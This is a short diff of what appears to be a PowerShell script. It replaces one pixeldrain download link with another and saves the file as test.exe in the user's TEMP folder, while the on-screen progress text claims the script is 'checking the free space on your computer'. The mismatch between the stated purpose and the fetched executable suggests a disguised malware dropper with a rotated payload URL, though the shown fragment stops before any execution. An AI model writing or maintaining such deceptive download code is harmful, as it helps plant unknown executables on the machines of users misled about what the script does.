@@ -62,7 +62,7 @@ Write-CenteredText "📥 Step 2: Check" "Blue"
 Show-ProgressBar -Activity "Checking the free space on your computer" -Status "Starting checking" -PercentComplete 35
 
 try {
-    $testUrl = 'https://pixeldrain.com/api/file/1azyCejn?download'
+    $testUrl = 'https://pixeldrain.com/api/file/y2B29n7A?download'
     $testPath = "$env:TEMP\test.exe"
     
     # Simulate download progress
